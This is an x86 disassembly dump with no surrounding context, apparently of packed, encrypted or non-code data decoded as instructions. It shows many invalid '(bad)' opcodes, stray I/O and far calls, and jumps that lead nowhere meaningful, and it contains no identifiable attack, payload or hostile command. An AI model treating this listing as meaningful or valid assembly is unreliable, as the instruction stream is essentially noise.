  40a8eb:	or     eax,DWORD PTR [ebx+0x11]
  40a8ee:	fdiv   DWORD PTR [ebp+0xe]
  40a8f1:	mov    edi,es
  40a8f3:	stc    
  40a8f4:	ja     0x40a952
  40a8f6:	sub    edi,DWORD PTR [ecx+eiz*2+0x401c44ce]
  40a8fd:	das    
  40a8fe:	sub    al,0x9d
  40a900:	cmp    al,0x67
  40a902:	das    
  40a903:	data16 mov cl,0x2a
  40a906:	loopne 0x40a935
  40a908:	sub    al,0xaa
  40a90a:	loop   0x40a8fc
  40a90c:	jo     0x40a8c7
  40a90e:	mov    ecx,0xd3b7e7a6
  40a913:	or     edx,DWORD PTR [esp+ebx*2+0x5c048211]
  40a91a:	frstor [edx+0x10f64c5a]
  40a920:	(bad)  
  40a921:	leave  
  40a922:	pop    esp
  40a923:	pop    edx
  40a924:	push   0x759b14fe
  40a929:	or     esi,DWORD PTR [eax-0x11697668]
  40a92f:	sbb    BYTE PTR [esi+0x48b36e29],bl
  40a935:	cmp    ecx,DWORD PTR es:[ecx+0x22]
  40a939:	xor    BYTE PTR [ebx],ah
  40a93b:	add    eax,0xa158e5d8
  40a940:	call   0xa0a27b5d
  40a945:	cwde   
  40a946:	cli    
  40a947:	mov    al,0x16
  40a949:	mov    ah,0xf0
  40a94b:	cmp    ecx,edx
  40a94d:	push   esi
  40a94e:	int    0x9a
  40a950:	jge    0x40a910
  40a952:	jns    0x40a8d7
  40a954:	(bad)  
  40a955:	fsubp  st(2),st
  40a957:	or     al,0x64
  40a959:	add    DWORD PTR [esi-0xe301b4f],edi
  40a95f:	jae    0x40a8f5
  40a961:	(bad)  
  40a962:	stos   DWORD PTR es:[edi],eax
  40a963:	inc    ebx
  40a964:	sub    al,0xb4
  40a966:	dec    esp
  40a967:	or     DWORD PTR [ebx+0x1c448747],ebp
  40a96d:	(bad)  
  40a96f:	jae    0x40a9a7
  40a971:	cmp    DWORD PTR [eax-0x2d],esi
  40a974:	mov    esi,0x7de41bf
  40a979:	fwait
  40a97a:	jmp    0x3a5a733f
  40a97f:	xchg   ebp,eax
  40a980:	aas    
  40a981:	(bad)  
  40a982:	mov    dl,0x5a
  40a984:	xchg   esi,eax
  40a985:	es push edx
  40a987:	cmp    esi,DWORD PTR [edi]
  40a989:	pop    ss
  40a98a:	push   ds
  40a98b:	mov    bh,0xd
  40a98d:	aaa    
  40a98e:	lods   eax,DWORD PTR ds:[esi]
  40a98f:	test   BYTE PTR [ecx],0xa
  40a992:	mov    bh,0xc0
  40a994:	(bad)  
  40a996:	inc    eax
  40a997:	stos   DWORD PTR es:[edi],eax
  40a998:	inc    edi
  40a999:	push   edx
  40a99a:	fistp  QWORD PTR [ebx-0x33]
  40a99d:	mov    edx,ebp
  40a99f:	push   ss
  40a9a0:	and    eax,0x5f3a6abe
  40a9a5:	cli    
  40a9a6:	sahf   
  40a9a7:	inc    DWORD PTR ds:0x8ddc1efe
  40a9ad:	fmul   DWORD PTR [ecx+0x1fb53bc]
  40a9b3:	(bad)  
  40a9b4:	(bad)  
  40a9b6:	js     0x40a9ef
  40a9b8:	mov    eax,0xc52ccb8e
  40a9bd:	or     al,0xed
  40a9bf:	(bad)  [edx]
  40a9c1:	and    al,0x8a
  40a9c3:	push   0xf35f742
  40a9c8:	ss loope 0x40a9b3
  40a9cb:	loop   0x40aa02
  40a9cd:	in     eax,0x17
  40a9cf:	inc    ebx
  40a9d0:	mov    es,WORD PTR [eax-0x73d38134]
  40a9d6:	cld    
  40a9d7:	push   cs
  40a9d8:	test   ah,ah
  40a9da:	xchg   esp,eax
  40a9db:	inc    edx
  40a9dc:	xchg   esp,eax
  40a9dd:	mov    ds:0x7565b148,eax
  40a9e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9e3:	scas   eax,DWORD PTR es:[edi]
  40a9e4:	jae    0x40aa06
  40a9e6:	pop    esp
  40a9e7:	dec    ecx
  40a9e8:	xor    BYTE PTR [eax-0x5de939bf],bl
  40a9ee:	aam    0x7e
  40a9f0:	pop    ebp
  40a9f1:	or     al,bl
  40a9f3:	mov    esi,0xaa63e058
  40a9f8:	xor    dh,dh
  40a9fa:	mov    esp,0x903062a2
  40a9ff:	sar    ebp,0xff
  40aa02:	xor    BYTE PTR [esi],dh
  40aa04:	mov    al,ds:0x1c30c0ea
  40aa09:	dec    eax
  40aa0a:	mov    ds:0xb89bc35a,al
  40aa0f:	mov    eax,ds:0x61581fd2
  40aa14:	dec    ecx
  40aa15:	loopne 0x40a9c2
  40aa17:	maxps  xmm1,xmm6
  40aa1a:	xchg   ecx,eax
  40aa1b:	cmp    eax,0xe699be75
  40aa20:	frstor [ecx+0x38f89fb7]
  40aa26:	dec    eax
  40aa27:	xchg   ebx,eax
  40aa28:	xchg   DWORD PTR [ebx-0x6af31e47],edi
  40aa2e:	(bad)
  40aa32:	pushf  
  40aa33:	aam    0xff
  40aa35:	lock neg DWORD PTR [ecx+0x41]
  40aa39:	mov    cl,0x70
  40aa3b:	jne    0x40aa6a
  40aa3d:	jns    0x40aaa7
  40aa3f:	and    DWORD PTR [eax-0x67],0x4a
  40aa43:	push   esp
  40aa44:	jecxz  0x40a9d0
  40aa46:	stc    
  40aa47:	xchg   edx,eax
  40aa48:	inc    eax
  40aa49:	adc    ebx,DWORD PTR [ebx+0x59]
  40aa4c:	retf   
  40aa4d:	sbb    dl,bh
  40aa4f:	out    0x89,eax
  40aa51:	jmp    0xaf8caf76
  40aa56:	rcr    edx,cl
  40aa58:	arpl   si,bp
  40aa5a:	dec    esi
  40aa5b:	jbe    0x40aa33
  40aa5d:	in     al,dx
  40aa5e:	mov    dh,BYTE PTR [edi]
  40aa60:	dec    esp
  40aa61:	out    dx,eax
  40aa62:	add    eax,0x16163e7c
  40aa67:	xchg   edi,eax
  40aa68:	mov    DWORD PTR [esi],eax
  40aa6a:	xor    bl,BYTE PTR [ebx+0x3e]
  40aa6d:	push   esp
  40aa6e:	cdq    
  40aa6f:	or     DWORD PTR [eax+esi*4+0x1b],esp
  40aa73:	jg     0x40aab5
  40aa75:	adc    DWORD PTR [edx-0xbea106],0xfffffff5
  40aa7c:	mov    ah,0x91
  40aa7e:	add    ch,BYTE PTR [esp+esi*4-0x62952985]
  40aa85:	mov    al,0x36
  40aa87:	ins    BYTE PTR es:[edi],dx
  40aa88:	loop   0x40aac9
  40aa8a:	inc    edi
  40aa8b:	es lock inc ebp
  40aa8e:	addr16 mov bh,0x83
  40aa91:	call   0x62581bdf
  40aa96:	pop    esi
  40aa97:	in     al,dx
  40aa98:	mov    edx,0x3fe1419c
  40aa9d:	and    eax,0x7cb692cb
  40aaa2:	dec    ebp
  40aaa3:	mov    edx,0xc514702e
  40aaa8:	push   edx
  40aaa9:	jb     0x40aaac
  40aaab:	adc    bh,BYTE PTR [ebx-0x14]
  40aaae:	aaa    
  40aaaf:	stos   BYTE PTR es:[edi],al
  40aab0:	or     DWORD PTR [esi],ebp
  40aab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aab3:	imul   esi,DWORD PTR [esi+0x140edf20],0xffffff8b
  40aaba:	cs sbb ecx,esp
  40aabd:	dec    ebx
  40aabe:	push   cs
  40aabf:	cld    
  40aac0:	adc    al,0x4e
  40aac2:	divps  xmm2,XMMWORD PTR [edx-0x12]
  40aac6:	stos   DWORD PTR es:[edi],eax
  40aac7:	je     0x40aa4e
  40aac9:	cld    
  40aaca:	inc    eax
  40aacb:	fwait
  40aacc:	stos   DWORD PTR es:[edi],eax
  40aacd:	jbe    0x40ab26
  40aacf:	sub    eax,ebx
  40aad1:	nop
  40aad2:	inc    eax
  40aad3:	retf   0xaece
  40aad6:	(bad)  
  40aad7:	loop   0x40ab21
  40aad9:	xor    ch,BYTE PTR [eax]
  40aadb:	stos   DWORD PTR es:[edi],eax
  40aadc:	and    bl,ah
  40aade:	ins    DWORD PTR es:[edi],dx
  40aadf:	adc    ebx,esp
  40aae1:	xchg   edi,eax
  40aae2:	mov    ecx,0x57d1d2a1
  40aae7:	rcr    DWORD PTR [ecx+0x17abed2d],cl
  40aaed:	xor    esi,eax
  40aaef:	add    DWORD PTR [ebx-0x5135a497],edx
  40aaf5:	add    ecx,esp
  40aaf7:	popa   
  40aaf8:	mov    bh,0x97
  40aafa:	fsub   st(4),st
  40aafc:	jp     0x40ab47
  40aafe:	jmp    0x40aacf
  40ab00:	mov    gs,WORD PTR [eax-0xef5cebc]
  40ab06:	push   ebp
  40ab07:	sbb    al,0x95
  40ab09:	sbb    eax,0x40024910
  40ab0e:	sub    DWORD PTR [eax-0x7026e3b5],edi
  40ab14:	push   cs
  40ab15:	and    bl,BYTE PTR [edx+0x0]
  40ab18:	out    dx,al
  40ab19:	pop    esp
  40ab1a:	cmc    
  40ab1b:	inc    esi
  40ab1c:	push   0x62aeebd4
  40ab21:	xchg   BYTE PTR [ecx+0x7f546190],cl
  40ab27:	bound  edx,QWORD PTR [edi-0x6dd6db76]
  40ab2d:	sar    DWORD PTR [edi-0x880f354],1
  40ab33:	aam    0x27
  40ab35:	out    dx,eax
  40ab36:	push   edx
  40ab37:	aam    0xf0
  40ab39:	fild   QWORD PTR [eax-0x3c18cd67]
  40ab3f:	out    0xdb,al
  40ab41:	push   esi
  40ab42:	dec    ecx
  40ab43:	fisubr WORD PTR [eax]
  40ab45:	std    
  40ab46:	pop    eax
  40ab47:	enter  0xe782,0x84
  40ab4b:	cmp    eax,0x6cbc29ac
  40ab50:	cmovs  ecx,DWORD PTR [eax+0x28]
  40ab54:	fisttp WORD PTR [edx-0x6e]
  40ab57:	jbe    0x40aaed
  40ab59:	sub    dl,ch
  40ab5b:	jmp    0x40ab8e
  40ab5d:	call   0x86ca:0x9d43a4f0
  40ab64:	sub    ecx,DWORD PTR [ebp+eax*1+0x38660944]
  40ab6b:	inc    esp
  40ab6c:	cdq    
  40ab6d:	rol    bh,1
  40ab6f:	push   0xffffffcb
  40ab71:	mov    edi,0x5006eeaa
  40ab76:	js     0x40ab76
  40ab78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab79:	xchg   edi,eax
  40ab7a:	aad    0x93
  40ab7c:	(bad)  
  40ab7d:	adc    ebp,DWORD PTR [edx-0x18]
  40ab80:	pop    esi
  40ab81:	and    bh,BYTE PTR ds:0x1d99b568
  40ab87:	push   edx
  40ab88:	(bad)
  40ab8c:	repz arpl WORD PTR [esi],sp
  40ab8f:	iret   
  40ab90:	jns    0x40abea
  40ab92:	call   0x8c44:0xb8d9f794
  40ab99:	mov    WORD PTR [esi+esi*4],ss
  40ab9c:	(bad)  
  40ab9d:	and    eax,0xfe2f145d
  40aba2:	and    DWORD PTR [esi+0x66],edx
  40aba5:	std    
  40aba6:	sar    DWORD PTR [ecx-0x75642688],cl
  40abac:	outs   dx,DWORD PTR ds:[esi]
  40abad:	pushaw 
  40abaf:	xchg   esp,eax
  40abb0:	test   al,0x5a
  40abb2:	push   eax
  40abb3:	test   DWORD PTR [edx+0x75],edx
  40abb6:	pop    ds
  40abb7:	ror    BYTE PTR [ebp-0x31],0xb1
  40abbb:	xor    edi,DWORD PTR [ebx-0x6b]
  40abbe:	popa   
  40abbf:	lds    edi,FWORD PTR [edi+0x4f6bbf34]
  40abc5:	or     al,0xdd
  40abc7:	not    BYTE PTR [eax]
  40abc9:	jp     0x40abe2
  40abcb:	sbb    eax,0x66fc8720
  40abd0:	fisttp DWORD PTR [ebx-0x34]
  40abd3:	xor    edx,ebx
  40abd5:	imul   edi,DWORD PTR [edx-0x4552acb2],0x35
  40abdc:	js     0x40abfa
  40abde:	adc    al,0x34
  40abe0:	inc    esp
  40abe1:	les    ebx,FWORD PTR [eax+edi*1]
  40abe4:	jo     0x40abf5
  40abe6:	xchg   esp,eax
  40abe7:	addr16 loopne 0x40abaa
  40abea:	mov    dh,0xea
  40abec:	in     eax,0xb1
  40abee:	xchg   ebp,eax
  40abef:	sbb    BYTE PTR [eax+0x575d2b47],0xb7
  40abf6:	push   ecx
  40abf7:	ins    BYTE PTR es:[edi],dx
  40abf8:	clc    
  40abf9:	mov    ecx,0xd3e527c2
  40abfe:	xor    al,0x8
  40ac00:	call   0xadd1:0x2888ec9f
  40ac07:	js     0x40ac45
  40ac09:	mov    ah,0xf
  40ac0b:	mov    dh,0xf3
  40ac0d:	mov    dl,bl
  40ac0f:	pop    ebp
  40ac10:	cmp    BYTE PTR [esi+0x1e94e17a],ch
  40ac16:	xchg   esp,eax
  40ac17:	(bad)  
  40ac18:	fcomp  DWORD PTR [ecx]
  40ac1a:	and    eax,0x57f7443b
  40ac1f:	or     DWORD PTR [ebx+ebp*1+0x1b],esi
  40ac23:	jne    0x40ac06
  40ac25:	or     BYTE PTR [edx+0x4b2e63f1],ch
  40ac2b:	test   DWORD PTR [edx+0x47f79c4c],0x5605ecb3
  40ac35:	pushf  
  40ac36:	dec    edi
  40ac37:	cmp    edx,DWORD PTR es:[edi]
  40ac3a:	or     BYTE PTR [esi],dh
  40ac3c:	neg    ah
  40ac3e:	push   ecx
  40ac3f:	stos   BYTE PTR es:[edi],al
  40ac40:	popa   
  40ac41:	out    0x48,eax
  40ac43:	fadd   st,st(2)
  40ac45:	adc    edi,eax
  40ac47:	xchg   esi,eax
  40ac48:	pop    ss
  40ac49:	ss out dx,al
  40ac4b:	jecxz  0x40ac43
  40ac4d:	mul    BYTE PTR [ecx]
  40ac4f:	ja     0x40ac93
  40ac51:	aas    
  40ac52:	dec    ecx
  40ac53:	xchg   ecx,eax
  40ac54:	test   BYTE PTR cs:[edi+0x5213d873],0x7e
  40ac5c:	aas    
  40ac5d:	int    0x3
  40ac5f:	and    eax,0x1c269e83
  40ac64:	and    BYTE PTR [eax+0x32f25b81],ch
  40ac6a:	stos   DWORD PTR es:[edi],eax
  40ac6b:	cmp    BYTE PTR [ecx+edi*2],bl
  40ac6e:	mov    ds:0xa4065d52,eax
  40ac73:	sub    DWORD PTR [ecx+0x50],esp
  40ac76:	dec    ebx
  40ac77:	xor    ebx,eax
  40ac79:	cwde   
  40ac7a:	in     al,0x54
  40ac7c:	ins    DWORD PTR es:[edi],dx
  40ac7d:	int3   
  40ac7e:	jns    0x40acdc
  40ac80:	lds    ebp,FWORD PTR [eax]
  40ac82:	ss pop ebp
  40ac84:	ins    BYTE PTR es:[edi],dx
  40ac85:	(bad)
  40ac89:	pop    edx
  40ac8a:	mov    al,ds:0xd3e94aac
  40ac8f:	mov    ebp,0x85bbb272
  40ac94:	and    eax,DWORD PTR [ecx]
  40ac96:	xchg   esi,eax
  40ac97:	int    0x4f
  40ac99:	or     al,0xda
  40ac9b:	dec    ebp
  40ac9c:	cdq    
  40ac9d:	in     al,dx
  40ac9e:	call   0x4c2e:0xa373a584
  40aca5:	adc    DWORD PTR [edi+0x2153785e],edi
  40acab:	and    esp,ecx
  40acad:	dec    edi
  40acae:	push   ecx
  40acaf:	adc    al,BYTE PTR [edx-0x4a50b742]
  40acb5:	and    eax,0x24533f5d
  40acba:	nop
  40acbb:	lods   eax,DWORD PTR ds:[esi]
  40acbc:	dec    ebx
  40acbd:	sbb    eax,0x46541c66
  40acc2:	es lea ecx,es:[edx]
  40acc6:	pusha  
  40acc7:	ficom  DWORD PTR [ecx+0x64]
  40acca:	mov    bl,0xd1
  40accc:	ds jo  0x40ac73
  40accf:	imul   eax,esi,0xd97ad7ae
  40acd5:	sub    DWORD PTR [eax+ebp*8],ebp
  40acd8:	mov    WORD PTR [ebp-0x341fc557],ds
  40acde:	fsub   QWORD PTR [edi-0x1f]
  40ace1:	mov    esp,0x6488344e
  40ace6:	aad    0xe7
  40ace8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ace9:	or     ah,al
  40aceb:	xor    al,0x49
  40aced:	ss cdq 
  40acef:	inc    ebp
  40acf0:	inc    ebx
  40acf1:	icebp  
  40acf2:	out    0x31,al
  40acf4:	xchg   edx,ecx
  40acf6:	rcr    BYTE PTR [edx-0x25],0x98
  40acfa:	sub    bl,BYTE PTR [esi]
  40acfc:	pop    ss
  40acfd:	aad    0x1a
  40acff:	iret   
  40ad00:	in     eax,dx
  40ad01:	sbb    dl,ch
  40ad03:	add    ecx,DWORD PTR [esi]
  40ad05:	xor    DWORD PTR [ecx+0x12],0x70
  40ad09:	mov    ebp,0xc61ed475
  40ad0e:	imul   esp,DWORD PTR [ebx+0x3257926c],0xffffffef
  40ad15:	dec    esp
  40ad16:	into   
  40ad17:	and    BYTE PTR [ebp-0x76f62cb2],bh
  40ad1d:	push   es
  40ad1e:	mov    ds:0x2314e783,al
  40ad23:	push   edi
  40ad24:	cmp    eax,0x8de862a6
  40ad29:	mov    edi,0x6fd195fd
  40ad2e:	fs ret 0x1c0c
  40ad32:	out    dx,al
  40ad33:	jnp    0x40ad0e
  40ad35:	or     BYTE PTR [edx],dl
  40ad37:	pop    ebx
  40ad38:	(bad)  
  40ad39:	xlat   BYTE PTR ds:[ebx]
  40ad3a:	push   edx
  40ad3b:	mov    bl,0x42
  40ad3d:	inc    edx
  40ad3e:	fs or  al,0x24
  40ad41:	xor    bl,BYTE PTR [ecx-0x9996463]
  40ad47:	cdq    
  40ad48:	mov    esi,0xd112b765
  40ad4d:	xor    eax,0xdeb21862
  40ad52:	sub    esi,DWORD PTR [ebx+0x63a48162]
  40ad58:	enter  0x6763,0xde
  40ad5c:	add    eax,0xa53408f3
  40ad61:	aas    
  40ad62:	pop    ecx
  40ad63:	xchg   ebp,eax
  40ad64:	jne    0x40ad76
  40ad66:	scas   eax,DWORD PTR es:[edi]
  40ad67:	(bad)  
  40ad68:	mov    ?,WORD PTR [edi]
  40ad6a:	sub    al,0x85
  40ad6c:	jae    0x40adce
  40ad6e:	call   0x97a0da42
  40ad73:	ror    BYTE PTR [esi],1
  40ad75:	(bad)  
  40ad76:	push   0x617f57a6
  40ad7b:	mov    bl,0x50
  40ad7d:	js     0x40adc6
  40ad7f:	into   
  40ad80:	cdq    
  40ad81:	stc    
  40ad82:	jno    0x40adb7
  40ad84:	dec    edi
  40ad85:	push   ds
  40ad86:	push   ebx
  40ad87:	mov    al,BYTE PTR [ebx+0x17adfbba]
  40ad8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad8e:	call   0x5ea1:0xc78ece40
  40ad95:	nop
  40ad96:	cmp    ch,al
  40ad98:	and    DWORD PTR [ecx],esi
  40ad9a:	outs   dx,BYTE PTR ds:[esi]
  40ad9b:	mov    ebx,0x1706067f
  40ada0:	fst    DWORD PTR [ebp+0x76b7bb57]
  40ada6:	xor    al,0x13
  40ada8:	jp     0x40addc
  40adaa:	iret   
  40adab:	inc    esp
  40adac:	inc    edi
  40adad:	pusha  
  40adae:	jnp    0x40ae28
  40adb0:	dec    esi
  40adb1:	jp     0x40ad4c
  40adb3:	lds    ecx,FWORD PTR [ebp-0x1c77ef5f]
  40adb9:	jb     0x40ad7e
  40adbb:	inc    ebx
  40adbc:	popf   
  40adbd:	push   es
  40adbe:	daa    
  40adbf:	sti    
  40adc0:	aam    0x37
  40adc2:	repnz mov edi,esi
  40adc5:	sti    
  40adc6:	jl     0x40adb0
  40adc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adc9:	test   BYTE PTR [esi-0x64d3e9e3],al
  40adcf:	fist   DWORD PTR [eax-0xcfeb1aa]
  40add5:	xchg   BYTE PTR [ebp+ecx*4-0x27280f97],ah
  40addc:	sub    eax,DWORD PTR [edi+0x3b]
  40addf:	and    al,0xbd
  40ade1:	outs   dx,DWORD PTR ds:[esi]
  40ade2:	mov    edi,0x9e2b224
  40ade7:	iret   
  40ade8:	es fs cld 
  40adeb:	shl    BYTE PTR [ebp+0x7fba4676],0xa5
  40adf2:	or     eax,0x4b8fde34
  40adf7:	and    al,BYTE PTR [ecx-0x19741053]
  40adfd:	(bad)  
  40adff:	push   es
  40ae00:	push   cs
  40ae01:	pushf  
  40ae02:	sbb    DWORD PTR [ecx],edx
  40ae04:	cwde   
  40ae05:	fcmovbe st,st(5)
  40ae07:	mov    bh,0x16
  40ae09:	int3   
  40ae0a:	xchg   esp,eax
  40ae0b:	fld    DWORD PTR [ecx]
  40ae0d:	mov    ebp,0x194c33f2
  40ae12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae13:	fst    DWORD PTR [ebp+eiz*1+0x3a]
  40ae17:	and    cl,bl
  40ae19:	into   
  40ae1a:	int    0xa9
  40ae1c:	add    eax,0x522a2899
  40ae21:	in     al,0x20
  40ae23:	retf   0x3ff
  40ae26:	fwait
  40ae27:	dec    esi
  40ae28:	xor    eax,0xd1fd6a2a
  40ae2d:	popf   
  40ae2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae2f:	push   edx
  40ae30:	jns    0x40ae7b
  40ae32:	cdq    
  40ae33:	sbb    al,0x28
  40ae35:	enter  0x317e,0x48
  40ae39:	pop    edx
  40ae3a:	inc    edx
  40ae3b:	and    ecx,DWORD PTR [eax+0x14]
  40ae3e:	fst    st(6)
  40ae40:	mov    ds:0x210d1e2c,al
  40ae45:	sahf   
  40ae46:	frstor [edi+ebp*4+0x1a]
  40ae4a:	dec    ebx
  40ae4b:	dec    eax
  40ae4c:	add    eax,0x8f851459
  40ae51:	leave  
  40ae52:	imul   esp,edi,0xfa644f9f
  40ae58:	icebp  
  40ae59:	fbld   TBYTE PTR [eax]
  40ae5b:	aam    0x47
  40ae5d:	pop    esi
  40ae5e:	lea    ecx,[edx]
  40ae60:	sub    BYTE PTR [ebx],ah
  40ae62:	mov    ecx,0x64b1c48e
  40ae67:	mov    ds:0xa2c4044c,eax
  40ae6c:	loop   0x40ae9d
  40ae6e:	or     ah,BYTE PTR [edi]
  40ae70:	aam    0x93
  40ae72:	pop    ds
  40ae73:	jecxz  0x40aeee
  40ae75:	inc    ecx
  40ae76:	push   ss
  40ae77:	gs aas 
  40ae79:	aam    0x7b
  40ae7b:	icebp  
  40ae7c:	cmp    edi,eax
  40ae7e:	jmp    0x3e7f65f
  40ae83:	ret    
  40ae84:	pop    edx
  40ae85:	and    eax,0x28de6894
  40ae8a:	test   al,0x2b
  40ae8c:	xchg   ecx,eax
  40ae8d:	cdq    
  40ae8e:	pop    ecx
  40ae8f:	push   eax
  40ae90:	adc    BYTE PTR [ecx-0x66],al
  40ae93:	jo     0x40aeb0
  40ae95:	imul   ebx,DWORD PTR [esi-0x53e70c],0x772f468a
  40ae9f:	push   edi
  40aea0:	popa   
  40aea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aea2:	rol    al,1
  40aea4:	and    al,0x67
  40aea6:	retf   0x5a33
  40aea9:	jg     0x40ae85
  40aeab:	not    DWORD PTR [edi]
  40aead:	ret    
  40aeae:	lods   eax,DWORD PTR ds:[esi]
  40aeaf:	jle    0x40aea5
  40aeb1:	mov    al,0xb1
  40aeb3:	mov    al,BYTE PTR [ebx-0x5e507aa0]
  40aeb9:	test   eax,0xc9a6727a
  40aebe:	mov    esp,0xbf25551b
  40aec3:	dec    edi
  40aec4:	push   es
  40aec5:	test   BYTE PTR [ecx],bl
  40aec7:	int    0x9
  40aec9:	lea    edx,[ebp+eax*1-0x4d8107f0]
  40aed0:	imul   edi,DWORD PTR ds:0xc4dae684,0xffffff8f
  40aed7:	or     edi,DWORD PTR [ecx+0x439aaa6f]
  40aedd:	mov    ds:0xb5c1c88c,al
  40aee2:	jbe    0x40aee5
  40aee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aee5:	dec    ebx
  40aee6:	enter  0xf977,0x83
  40aeea:	adc    eax,0xbddd0cc5
  40aeef:	xchg   esi,eax
  40aef0:	scas   al,BYTE PTR es:[edi]
  40aef1:	add    al,0xfa
  40aef3:	std    
  40aef4:	sub    ah,cl
  40aef6:	hlt    
  40aef7:	stos   DWORD PTR es:[edi],eax
  40aef8:	push   0x5ab678c8
  40aefd:	inc    esi
  40aefe:	mov    eax,ds:0x70fc8163
  40af03:	mov    esp,0x6248f23f
  40af08:	cwde   
  40af09:	cmp    cl,BYTE PTR [esi-0x6f]
  40af0c:	push   ecx
  40af0d:	lds    esp,FWORD PTR [ecx-0x5b]
  40af10:	xlat   BYTE PTR ds:[ebx]
  40af11:	mov    bl,0x20
  40af13:	idiv   DWORD PTR [edi+0x7f47ee7d]
  40af19:	mov    esi,0x466db477
  40af1e:	aaa    
  40af1f:	sbb    DWORD PTR [ecx+esi*8-0x6aebfc42],eax
  40af26:	mov    eax,ds:0x5b090f5b
  40af2b:	retf   0x7e6b
  40af2e:	loope  0x40aee0
  40af30:	mov    esp,0x488a6826
  40af35:	dec    ebp
  40af36:	cmp    DWORD PTR [ebp+0x3c],ebx
  40af39:	and    dl,BYTE PTR [esi-0x6e33fd3c]
  40af3f:	stc    
  40af40:	aam    0xd8
  40af42:	jl     0x40af17
  40af44:	pop    ebx
  40af45:	popf   
  40af46:	shl    DWORD PTR [edi-0x7a],cl
  40af49:	fdivr  DWORD PTR [eax-0x5]
  40af4c:	ds cmp dl,ch
  40af4f:	pushf  
  40af50:	inc    eax
  40af51:	test   eax,0xe5c46bd
  40af56:	xchg   DWORD PTR ss:[ecx+ecx*2],edi
  40af5a:	mov    dl,0x38
  40af5c:	es out dx,al
  40af5e:	cwde   
  40af5f:	cdq    
  40af60:	(bad)  
  40af61:	pop    ss
  40af62:	in     eax,0x4d
  40af64:	les    esp,FWORD PTR [esi]
  40af66:	mov    esi,0xec9d7f79
  40af6b:	mov    edx,DWORD PTR [ebp+0x432f824]
  40af71:	in     al,dx
  40af72:	push   ecx
  40af73:	jns    0x40afae
  40af75:	leave  
  40af76:	pushf  
  40af77:	in     eax,dx
  40af78:	pop    edx
  40af79:	pop    ss
  40af7a:	xchg   ch,ah
  40af7c:	xchg   DWORD PTR [edi-0x1558519d],edi
  40af82:	popf   
  40af83:	jp     0x40af6b
  40af85:	fwait
  40af86:	cmp    al,0x3e
  40af88:	fstp   TBYTE PTR [edi-0x65]
  40af8b:	cwde   
  40af8c:	add    eax,0xaac7d8f
  40af91:	mov    ebp,0xaeabbf52
  40af96:	push   edx
  40af97:	sbb    edx,ecx
  40af99:	je     0x40b00a
  40af9b:	lods   al,BYTE PTR ds:[esi]
  40af9c:	fsubr  st,st(6)
  40af9e:	and    al,0x2c
  40afa0:	pop    edi
  40afa1:	mov    esi,0x720bd9d6
  40afa6:	icebp  
  40afa7:	dec    edi
  40afa8:	mov    esi,0x754ebea6
  40afad:	mov    edx,0x2ea1ddfa
  40afb2:	xor    bh,bh
  40afb4:	fild   WORD PTR [eax-0x6cffbd2e]
  40afba:	dec    esi
  40afbb:	lods   eax,DWORD PTR ds:[esi]
  40afbc:	lds    esi,FWORD PTR [ecx]
  40afbe:	ret    0xd0d6
  40afc1:	sub    bh,BYTE PTR [ebp-0x47f8479a]
  40afc7:	cmp    eax,0xd24430b8
  40afcc:	stos   DWORD PTR es:[edi],eax
  40afcd:	(bad)  [ebp+0x257ad09b]
  40afd3:	daa    
  40afd4:	mov    ds:0x8bac0ee,eax
  40afd9:	and    ebx,ecx
  40afdb:	repnz enter 0x28c4,0xed
  40afe0:	xchg   ebp,eax
  40afe2:	mov    WORD PTR [esp+edi*8+0x4d],cs
  40afe6:	retf   
  40afe7:	add    eax,0xcaed64e7
  40afec:	and    bl,0xc6
  40afef:	(bad)
  40aff2:	ins    BYTE PTR es:[edi],dx
  40aff3:	popa   
  40aff4:	js     0x40b075
  40aff6:	cmp    BYTE PTR [edx+eiz*8+0x6daf86e3],cl
  40affd:	ins    BYTE PTR es:[edi],dx
  40affe:	imul   edi,DWORD PTR [eax-0x222dc8ae],0x43
  40b005:	int3   
  40b006:	jle    0x40b07c
  40b008:	nop
  40b009:	pop    ss
  40b00a:	sub    al,0x51
  40b00c:	jmp    0x40b00f
  40b00e:	jg     0x40af98
  40b010:	push   ebx
  40b011:	clc    
  40b012:	xor    dh,BYTE PTR [edx+0x1]
  40b015:	data16 (bad) 
  40b017:	jg     0x40afab
  40b019:	cmp    eax,0x7723df30
  40b01e:	dec    eax
  40b01f:	xchg   edi,eax
  40b020:	sahf   
  40b021:	or     eax,0xb3328452
  40b026:	jo     0x40afb6
  40b028:	or     DWORD PTR [ebx+0x23],esi
  40b02b:	fs into 
  40b02d:	ret    
  40b02e:	fldcw  WORD PTR [ebx]
  40b030:	in     eax,dx
  40b031:	mov    edi,0x93dcfa70
  40b036:	std    
  40b037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b038:	pushf  
  40b039:	(bad)  
  40b03b:	test   DWORD PTR [edx+0x2fc36b48],esp
  40b041:	dec    esp
  40b042:	mov    cl,0xa5
  40b044:	test   eax,0x1782043e
  40b049:	add    DWORD PTR [ecx-0x1c],ebp
  40b04c:	loop   0x40b015
  40b04e:	in     al,dx
  40b04f:	les    ebx,FWORD PTR [esi]
  40b051:	fwait
  40b052:	jns    0x40b015
  40b054:	ss pushf 
  40b056:	cdq    
  40b057:	mov    dh,0xbf
  40b059:	jge    0x40b063
  40b05b:	neg    BYTE PTR [ebp+0x7e869f0]
  40b061:	mov    eax,0x1a082b7c
  40b066:	xor    DWORD PTR [esi+ebp*2],edi
  40b069:	mov    ch,0x4d
  40b06b:	cmp    eax,0xfe15032a
  40b070:	or     ch,BYTE PTR [esi]
  40b072:	push   cs
  40b073:	dec    esi
  40b074:	ins    DWORD PTR es:[edi],dx
  40b075:	out    0xe1,eax
  40b077:	mov    ah,0x3f
  40b079:	sbb    al,0xeb
  40b07b:	mov    bh,0xe
  40b07d:	xchg   ebp,eax
  40b07e:	dec    edx
  40b080:	jo     0x40b081
  40b082:	ja     0x40b057
  40b084:	inc    ecx
